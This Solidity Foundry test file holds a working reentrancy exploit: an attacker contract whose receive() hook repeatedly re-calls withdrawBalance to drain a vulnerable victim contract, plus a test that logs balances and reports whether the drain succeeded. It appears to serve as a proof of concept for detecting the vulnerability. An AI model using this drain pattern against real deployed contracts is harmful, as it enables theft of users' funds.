// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_simple.sol";

contract ReentranceAttack {
    Reentrance public victim;
    uint public attackCount;
    uint public attackAmount;

    constructor(address _victimAddress) payable {
        victim = Reentrance(_victimAddress);
    }

    function deposit() public payable {
        victim.addToBalance{value: msg.value}();
    }

    function attack() public {
        attackAmount = victim.getBalance(address(this));
        victim.withdrawBalance();
    }

    receive() external payable {
        if (address(victim).balance >= attackAmount && attackCount < 10) {
            attackCount++;
            victim.withdrawBalance();
        }
    }
}

contract ReentranceTest is Test {
    Reentrance public victim;
    ReentranceAttack public attacker;
    address public user = address(0x1);
    uint public initialDeposit = 10 ether;

    function setUp() public {
        victim = new Reentrance();
        attacker = new ReentranceAttack(address(victim));

        // Fund the victim contract
        vm.deal(address(victim), initialDeposit);

        // Attacker deposits some funds
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        attacker.deposit{value: 1 ether}();
    }

    function testReentrancyAttack() public {
        console.log("--- BEFORE-Trigger State---");
        uint initialVictimBalance = address(victim).balance;
        uint initialAttackerBalance = address(attacker).balance;
        console.log("Victim balance (ETH):", initialVictimBalance);
        console.log("Attacker balance (ETH):", initialAttackerBalance);
        console.log("Total system balance (ETH):", initialVictimBalance + initialAttackerBalance);

        console.log("--- Trigger: Attack ---");
        vm.prank(address(attacker));
        attacker.attack();

        console.log("--- AFTER-Trigger State---");
        uint finalVictimBalance = address(victim).balance;
        uint finalAttackerBalance = address(attacker).balance;
        console.log("Victim balance (ETH):", finalVictimBalance);
        console.log("Attacker balance (ETH):", finalAttackerBalance);
        console.log("Total system balance (ETH):", finalVictimBalance + finalAttackerBalance);
        
        console.log("--- Differential Results ---");
        bool victimDrained = initialVictimBalance > finalVictimBalance;
        bool attackerGained = finalAttackerBalance > initialAttackerBalance + 1 ether;
        bool vulnerabilityExists = victimDrained && attackerGained;
        
        console.log("Victim drained:", victimDrained);
        console.log("Attacker gained extra ETH:", attackerGained);
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Attacker successfully drained funds via reentrancy");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack failed to steal extra funds");
        }
    }
}